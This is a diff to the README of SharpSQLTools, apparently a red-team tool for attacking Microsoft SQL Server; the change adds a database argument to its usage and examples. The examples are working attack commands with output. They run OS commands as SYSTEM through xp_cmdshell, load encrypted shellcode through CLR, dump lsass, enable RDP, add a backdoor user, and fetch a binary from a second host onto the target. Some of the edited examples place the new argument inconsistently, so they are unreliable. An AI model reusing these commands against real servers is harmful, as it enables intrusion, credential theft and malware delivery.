@@ -23,8 +23,8 @@
 
 Usage:
 
-SharpSQLTools target username password                   - interactive console
-SharpSQLTools target username password module command    - non-interactive console
+SharpSQLTools target username password database                   - interactive console
+SharpSQLTools target username password database module command    - non-interactive console
 
 Module:
 
@@ -57,8 +57,8 @@ exit                       - terminates the server process (and this session)
 支持交互模式与非交互模式，交互模式直接跟目标，用户名和密码即可。非交互模式直接跟模块与命令。
 
 ```
-SharpSQLTools target username password                   - interactive console
-SharpSQLTools target username password module command    - non-interactive console
+SharpSQLTools target username password database                   - interactive console
+SharpSQLTools target username password database module command    - non-interactive console
 ```
 
 
@@ -66,7 +66,7 @@ SharpSQLTools target username password module command    - non-interactive conso
 #### xp_cmdshell执行命令
 
 ```
-λ SharpSQLTools.exe 192.168.28.27 sa 1qaz@WSX xp_cmdshell whoami
+λ SharpSQLTools.exe 192.168.28.27 sa 1qaz@WSX xp_cmdshell whoami master
 [*] Database connection is successful!
 
 nt authority\system
@@ -78,7 +78,7 @@ nt authority\system
 #### sp_oacreate执行命令
 
 ```
-λ SharpSQLTools.exe 192.168.0.102 sa 1qaz@WSX sp_oacreate "whoami"
+λ SharpSQLTools.exe 192.168.0.102 sa 1qaz@WSX master sp_oacreate master "whoami"
 [*] Database connection is successful!
 
 nt service\mssqlserver
@@ -90,7 +90,7 @@ nt service\mssqlserver
 XorKey: 1234
 Result: zXqw0MHa8zQxMnJlcGJhZWd6AuZUerhmUXq4Zil6uGYRerhGYXo8g3t4fgX4egL0nQ5SSDMeE3Xw+z51MPPR2WNzYny6YBO/cw57NeG5s7wxMjN8tPJHU3kz42S6eitwunITfTDi0GJ5zfp1uga7fDDkfgX4egL0nXPy/TxzMvUJ0kbFfTF/EDl3CuVE6mtwunIXfTDiVXW6PntwunIvfTDicr81uns14XNrdWlsam5wanJtcGh7t90ScmbO0mt1aGh7vyPbZMvOzW59j0VABm4BATQxc2V9uNR7td2SMjQxe7rReI4xNDgv85wxV3JgeLvXeLjDco59RRUzzud/vdtaMjUxMmp1ixuzXzHN5mRhfwL9fAPzfM7ye73zesz0ebvydYvYPOvRzeZ8uPVZJHBqf73TerrNcIiqkUVTzOF5s/d0MzIzfYlRXlAxMjM0MXNjdWF6utZmZWR5APJZOWhzY9bNVPRwFWYyNXm/dxAp9DNcebvVYmFzY3Vhc2N9zvJyZHjN+3m483+98HOJTf0NtcvkegLmec35vz9ziTy2L1PL5InDgZNkco6Xp46pzud7t/UaDzJNOLPP0Uc2j3YhQVtbMmp1uOjM4Q==
 
-λ SharpSQLTools.exe 192.168.0.107 sa 1qaz@WSX clr_scloader zXqw0MHa8zQxMnJlcGJhZWd6AuZUerhmUXq4Zil6uGYRerhGYXo8g3t4fgX4egL0nQ5SSDMeE3Xw+z51MPPR2WNzYny6YBO/cw57NeG5s7wxMjN8tPJHU3kz42S6eitwunITfTDi0GJ5zfp1uga7fDDkfgX4egL0nXPy/TxzMvUJ0kbFfT F/EDl3CuVE6mtwunIXfTDiVXW6PntwunIvfTDicr81uns14XNrdWlsam5wanJtcGh7t90ScmbO0mt1aGh7vyPbZMvOzW59j0VABm4BATQxc2V9uNR7td2SMjQxe7rReI4xNDgv85wxV3JgeLvXeLjDco59RRUzzud/vdtaMjUxMmp1ixuzXzHN5mRhfwL9fAPzfM7ye73zesz0ebvydYvYPOvRzeZ8uPVZJHBqf73TerrNcIiqkUVTzOF5s/d0MzIzfYlRXlAxMjM0MXNjdWF6utZmZWR5APJZOWhzY9bNVPRwFWYyNXm/dxAp9DNcebvVYmFzY3Vhc2N9zvJyZHjN+3m483+98HOJTf0NtcvkegLmec35vz9ziTy2L1PL5InDgZNkco6Xp46pzud7t/UaDzJNOLPP0Uc2j3YhQVtbMmp1uOjM4Q== 1234
+λ SharpSQLTools.exe 192.168.0.107 sa 1qaz@WSX master clr_scloader zXqw0MHa8zQxMnJlcGJhZWd6AuZUerhmUXq4Zil6uGYRerhGYXo8g3t4fgX4egL0nQ5SSDMeE3Xw+z51MPPR2WNzYny6YBO/cw57NeG5s7wxMjN8tPJHU3kz42S6eitwunITfTDi0GJ5zfp1uga7fDDkfgX4egL0nXPy/TxzMvUJ0kbFfT F/EDl3CuVE6mtwunIXfTDiVXW6PntwunIvfTDicr81uns14XNrdWlsam5wanJtcGh7t90ScmbO0mt1aGh7vyPbZMvOzW59j0VABm4BATQxc2V9uNR7td2SMjQxe7rReI4xNDgv85wxV3JgeLvXeLjDco59RRUzzud/vdtaMjUxMmp1ixuzXzHN5mRhfwL9fAPzfM7ye73zesz0ebvydYvYPOvRzeZ8uPVZJHBqf73TerrNcIiqkUVTzOF5s/d0MzIzfYlRXlAxMjM0MXNjdWF6utZmZWR5APJZOWhzY9bNVPRwFWYyNXm/dxAp9DNcebvVYmFzY3Vhc2N9zvJyZHjN+3m483+98HOJTf0NtcvkegLmec35vz9ziTy2L1PL5InDgZNkco6Xp46pzud7t/UaDzJNOLPP0Uc2j3YhQVtbMmp1uOjM4Q== 1234
 [*] Database connection is successful!
 [+] EncryptShellcode: zXqw0MHa8zQxMnJlcGJhZWd6AuZUerhmUXq4Zil6uGYRerhGYXo8g3t4fgX4egL0nQ5SSDMeE3Xw+z51MPPR2WNzYny6YBO/cw57NeG5s7wxMjN8tPJHU3kz42S6eitwunITfTDi0GJ5zfp1uga7fDDkfgX4egL0nXPy/TxzMvUJ0kbFfTF/EDl3CuVE6mtwunIXfTDiVXW6PntwunIvfTDicr81uns14XNrdWlsam5wanJtcGh7t90ScmbO0mt1aGh7vyPbZMvOzW59j0VABm4BATQxc2V9uNR7td2SMjQxe7rReI4xNDgv85wxV3JgeLvXeLjDco59RRUzzud/vdtaMjUxMmp1ixuzXzHN5mRhfwL9fAPzfM7ye73zesz0ebvydYvYPOvRzeZ8uPVZJHBqf73TerrNcIiqkUVTzOF5s/d0MzIzfYlRXlAxMjM0MXNjdWF6utZmZWR5APJZOWhzY9bNVPRwFWYyNXm/dxAp9DNcebvVYmFzY3Vhc2N9zvJyZHjN+3m483+98HOJTf0NtcvkegLmec35vz9ziTy2L1PL5InDgZNkco6Xp46pzud7t/UaDzJNOLPP0Uc2j3YhQVtbMmp1uOjM4Q==
 [+] XorKey: 1234
@@ -108,7 +108,7 @@ Result: zXqw0MHa8zQxMnJlcGJhZWd6AuZUerhmUXq4Zil6uGYRerhGYXo8g3t4fgX4egL0nQ5SSDMe
 #### clr_dumplsass
 
 ```
-λ SharpSQLTools.exe 192.168.28.27 sa 1qaz@WSX clr_dumplsass
+λ SharpSQLTools.exe 192.168.28.27 sa 1qaz@WSX master clr_dumplsass
 [*] Database connection is successful!
 
 [*] Dumping lsass (488) to C:\Windows\Temp\debug488.out
@@ -128,7 +128,7 @@ Result: zXqw0MHa8zQxMnJlcGJhZWd6AuZUerhmUXq4Zil6uGYRerhGYXo8g3t4fgX4egL0nQ5SSDMe
 ### clr_RDP
 
 ```
-λ SharpSQLTools.exe 192.168.0.103 sa 1qaz@WSX "clr_RDP"
+λ SharpSQLTools.exe 192.168.0.103 sa 1qaz@WSX master "clr_RDP"
 [*] Database connection is successful!
 [*] RDP is already enabled
 [+] RDP Port: 3389
@@ -137,7 +137,7 @@ Result: zXqw0MHa8zQxMnJlcGJhZWd6AuZUerhmUXq4Zil6uGYRerhGYXo8g3t4fgX4egL0nQ5SSDMe
 ### clr_getav
 
 ```
-λ SharpSQLTools.exe 192.168.0.103 sa 1qaz@WSX "clr_getav"
+λ SharpSQLTools.exe 192.168.0.103 sa 1qaz@WSX master "clr_getav"
 [*] Database connection is successful!
 [*] Finding....
    [>] proName: wdswfsafe appName: 360杀毒-网盾
@@ -147,7 +147,7 @@ Result: zXqw0MHa8zQxMnJlcGJhZWd6AuZUerhmUXq4Zil6uGYRerhGYXo8g3t4fgX4egL0nQ5SSDMe
 #### clr_adduser
 
 ```
-λ SharpSQLTools.exe 192.168.28.27 sa 1qaz@WSX clr_adduser test1234 1qaz@WSX
+λ SharpSQLTools.exe 192.168.28.27 sa 1qaz@WSX master clr_adduser test1234 1qaz@WSX
 [*] Database connection is successful!
 [*] Adding User success
 [*] Adding Group Member success
@@ -158,7 +158,7 @@ Result: zXqw0MHa8zQxMnJlcGJhZWd6AuZUerhmUXq4Zil6uGYRerhGYXo8g3t4fgX4egL0nQ5SSDMe
 #### clr_download
 
 ```
-λ SharpSQLTools.exe 192.168.28.27 sa 1qaz@WSX clr_download "http://192.168.28.185:8001/clac.bin" "c:\Users\Public\Downloads\test.bin"
+λ SharpSQLTools.exe 192.168.28.27 sa 1qaz@WSX master clr_download "http://192.168.28.185:8001/clac.bin" "c:\Users\Public\Downloads\test.bin"
 [*] Database connection is successful!
 [*] Download success
 ```
@@ -167,7 +167,7 @@ Result: zXqw0MHa8zQxMnJlcGJhZWd6AuZUerhmUXq4Zil6uGYRerhGYXo8g3t4fgX4egL0nQ5SSDMe
 #### upload
 
 ```
-λ SharpSQLTools.exe 192.168.28.27 sa 1qaz@WSX upload C:\Users\Pentest\Desktop\test\usc.exe c:\Users\Public\Downloads\11.exe
+λ SharpSQLTools.exe 192.168.28.27 sa 1qaz@WSX master upload C:\Users\Pentest\Desktop\test\usc.exe c:\Users\Public\Downloads\11.exe
 [*] Database connection is successful!
 [*] Uploading 'C:\Users\Pentest\Desktop\test\usc.exe' to 'c:\Users\Public\Downloads\11.exe'...
 [+] 7-1 Upload completed
@@ -187,7 +187,7 @@ Result: zXqw0MHa8zQxMnJlcGJhZWd6AuZUerhmUXq4Zil6uGYRerhGYXo8g3t4fgX4egL0nQ5SSDMe
 #### download
 
 ```
-λ SharpSQLTools.exe 192.168.28.27 sa 1qaz@WSX download c:\Users\Public\Downloads\t.txt C:\Users\Pentest\Desktop\test\t.txt
+λ SharpSQLTools.exe 192.168.28.27 sa 1qaz@WSX master download c:\Users\Public\Downloads\t.txt C:\Users\Pentest\Desktop\test\t.txt
 [*] Database connection is successful!
 [*] Downloading 'c:\Users\Public\Downloads\t.txt' to 'C:\Users\Pentest\Desktop\test\t.txt'...
 [*] 'c:\Users\Public\Downloads\t.txt' Download completed
